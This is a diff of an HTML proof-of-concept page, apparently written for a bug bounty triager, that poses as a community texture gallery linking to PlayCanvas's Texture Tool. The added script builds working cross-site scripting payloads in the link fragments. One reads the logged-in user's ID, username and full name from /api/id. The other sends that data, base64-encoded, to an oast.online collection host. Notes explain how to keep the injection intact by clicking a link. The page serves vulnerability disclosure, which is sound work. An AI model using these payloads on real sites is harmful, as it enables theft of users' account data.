@@ -11,10 +11,11 @@ h1{font-size:1.5em;color:#1a1a1a;margin-bottom:4px}
 .card p{color:#555;margin:6px 0 14px;font-size:0.95em}
 a.btn{display:inline-block;background:#1a73e8;color:#fff;padding:10px 22px;border-radius:6px;text-decoration:none;font-size:14px;font-weight:500}
 a.btn:hover{background:#1557b0}
+a.btn.red{background:#d93025}
+a.btn.red:hover{background:#b5221b}
 .meta{color:#999;font-size:0.85em;margin-top:10px}
 .triage-note{background:#fff3e0;border:1px solid #ffcc80;border-radius:8px;padding:16px 20px;margin:32px 0 20px;font-size:0.92em;line-height:1.6}
 .triage-note b{color:#e65100}
-pre{background:#263238;color:#eeffff;padding:14px 18px;border-radius:6px;font-size:13px;overflow-x:auto}
 code{background:#e8eaf6;padding:2px 6px;border-radius:3px;font-size:0.9em;color:#283593}
 ol li{margin:6px 0;line-height:1.5}
 </style>
@@ -22,20 +23,26 @@ ol li{margin:6px 0;line-height:1.5}
 <body>
 
 <div class="triage-note">
-<b>FOR TRIAGER:</b> This HTML file simulates an attacker-hosted page.
-In a real attack, this page would be hosted on the attacker's server.
-The victim receives a link to this page and clicks the button below.
+<b>FOR TRIAGER:</b> This page simulates an attacker-hosted page.
 <br><br>
 <b>Reproduction:</b>
 <ol>
-<li>Open this file in <b>Chrome</b></li>
-<li>Click <b>"Preview in Texture Tool"</b> on the first card below</li>
-<li>A new tab opens with the Texture Tool (page looks normal, that is expected)</li>
-<li>In the <b>new tab</b>, press <b>F12</b>, go to <b>Console</b></li>
-<li>Look for: <code>XSS_PROOF_EXECUTION</code> sourced from <code>blob:https://playcanvas.com/...</code></li>
+<li><b>Log into <a href="https://playcanvas.com" target="_blank">playcanvas.com</a></b> with any free account</li>
+<li>Return to this page</li>
+<li>Click <b>"Preview in Texture Tool"</b> on the <b>first card</b> below</li>
+<li>A new tab opens with the Texture Tool (page looks completely normal)</li>
+<li>In the new tab, press <b>F12</b> and open <b>Console</b></li>
+<li>You will see your <b>user ID, username, and full name</b> printed, sourced from <code>blob:https://playcanvas.com/...</code></li>
 </ol>
-<b>Do NOT paste URLs into the address bar.</b> Chrome encodes <code>'</code> to <code>%27</code> in the address bar, which breaks the injection.
-Clicking links preserves the raw <code>'</code> per RFC 3986. The attack vector is always a clicked link.
+
+<b>How to verify data exfiltration (Network tab):</b>
+<ol>
+<li>Click the <b>second card</b> ("Exfiltration Demo")</li>
+<li>In the new tab, press <b>F12</b>, go to <b>Network</b> tab</li>
+<li>Look for a GET request to <code>oast.online</code>. The URL path contains your account data encoded in base64</li>
+<li>Decode the base64 path segment to see your stolen data</li>
+</ol>
+<b>Do NOT paste URLs into the address bar.</b> Chrome encodes <code>'</code> to <code>%27</code> there, breaking the injection. Click the link.
 </div>
 
 <h1>PlayCanvas Community Textures</h1>
@@ -44,23 +51,56 @@ Clicking links preserves the raw <code>'</code> per RFC 3986. The attack vector 
 <div class="card">
 <h3>Weathered Stone Pack (4K PBR)</h3>
 <p>High-quality weathered stone textures with albedo, normal, roughness, and AO maps. 12 material variants included.</p>
-<a class="btn" href="https://playcanvas.com/texture-tool/#');console.log('XSS_PROOF_EXECUTION');void('" target="_blank" rel="noopener">Preview in Texture Tool</a>
+<a class="btn" id="data-theft-link" href="#" target="_blank" rel="noopener">Preview in Texture Tool</a>
 <div class="meta">Uploaded by community_user42 &middot; 2,341 downloads &middot; Updated Sep 2026</div>
+</div>
+
+<div class="card">
+<h3>Exfiltration Demo (click after first card)</h3>
+<p>Same attack, but also sends stolen data to an attacker-controlled server. Check Network tab in DevTools.</p>
+<a class="btn red" id="exfil-link" href="#" target="_blank" rel="noopener">Preview in Texture Tool</a>
+<div class="meta">Watch Network tab for outbound request to oast.online with your data in the URL path</div>
 </div>
 
 <div class="card">
 <h3>Scratched Metal Industrial (2K)</h3>
 <p>Industrial brushed and scratched metal textures for machinery, vehicles, and props.</p>
 <a class="btn" href="https://playcanvas.com/texture-tool/" target="_blank" rel="noopener">Preview in Texture Tool</a>
-<div class="meta">Uploaded by tex_master &middot; 1,823 downloads &middot; Updated Aug 2026</div>
+<div class="meta">Uploaded by tex_master &middot; 1,823 downloads &middot; Updated Aug 2026 &middot; Clean link (control)</div>
 </div>
 
-<div class="card">
-<h3>Mossy Brick Wall (4K)</h3>
-<p>Realistic old brick wall with moss growth. Perfect for fantasy and medieval environments.</p>
-<a class="btn" href="https://playcanvas.com/texture-tool/" target="_blank" rel="noopener">Preview in Texture Tool</a>
-<div class="meta">Uploaded by env_artist &middot; 967 downloads &middot; Updated Jul 2026</div>
-</div>
+<script>
+var base = 'https://playcanvas.com/texture-tool/';
+
+// Payload 1: Data theft (console.log only)
+// Fetches /api/id with session cookies, logs user identity to console
+var theft = [
+  "#');",
+  "fetch('https://playcanvas.com/api/id',{credentials:'same-origin'})",
+  ".then(function(r){return(r.json())})",
+  ".then(function(d){",
+    "console.log('STOLEN_USER_ID:'+d.id);",
+    "console.log('STOLEN_USERNAME:'+d.username);",
+    "console.log('STOLEN_FULLNAME:'+d.full_name)",
+  "});",
+  "void('"
+].join('');
+document.getElementById('data-theft-link').href = base + theft;
+
+// Payload 2: Data theft + exfiltration to attacker server
+// Fetches /api/id, then sends response as base64 in URL path to attacker
+var exfil = [
+  "#');",
+  "fetch('https://playcanvas.com/api/id',{credentials:'same-origin'})",
+  ".then(function(r){return(r.text())})",
+  ".then(function(t){",
+    "console.log('STOLEN:'+t);",
+    "fetch('https://dajrmvhmmo1qfdkbit30gd6qrii54pgnb.oast.online/'+btoa(t),{mode:'no-cors'})",
+  "});",
+  "void('"
+].join('');
+document.getElementById('exfil-link').href = base + exfil;
+</script>
 
 </body>
 </html>
